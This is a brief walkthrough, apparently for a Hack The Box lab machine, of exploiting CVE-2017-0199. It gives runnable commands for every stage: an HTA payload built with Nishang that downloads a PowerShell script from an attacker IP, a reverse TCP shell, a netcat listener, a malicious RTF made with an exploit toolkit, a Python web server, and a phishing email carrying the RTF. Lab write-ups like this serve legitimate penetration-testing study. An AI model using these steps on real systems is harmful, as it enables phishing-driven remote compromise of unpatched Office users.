# CVE-2017-0199

## Exploitation Steps
1. Create the HTA Payload with Nishang (Out-HTA.ps1)
 - Open PowerShell on Kali (pwsh)
 - Type: ```Out-HTA -PayloadURL http://10.10.16.4/shell.ps1```
 - File is written to disk: "HTA written to /www/WindDef_WebInstall.hta"
 - [Optional] rename file to shell.hta

2. Create a PowerShell shell, again using Nishang (Invoke-PowerShellTcp.ps1)
 - Modify the file to include the Invoke-PowerShellTCP method at the bottom of the script
 - Make sure to change the Reverse IP Address
 - [Optional] rename the file to shell.ps1

3. Start a reverse handler with Netcat
 - nc -nlvp <port>

4. Create the malicious RTF document with cve-2017-0199.py
 - python2 cve-2017-0199_toolkit.py -M gen -t RTF -w <name of rtf> -u 'http://location_to_hta' -x 0

5. Start up a python listner on port 80
 - sudo python -m http.server 80

6. Send the phish
 - sendemail -t nico@megabank.com -f badguy@malicious.local -s reel.htb.local -u RTF -m "Important" -a invoice.rtf

7. Catch the shell and move back to enumeration

## Additional Sample Commands

```
python2 cve-2017-0199_toolkit.py -M gen -t RTF -w invoice.rtf -u 'http://10.10.16.4/shell.hta' -x 0
sendemail -t nico@megabank.com -f badguy@malicious.local -s reel.htb.local -u RTF -m "Important" -a invoice.rtf
```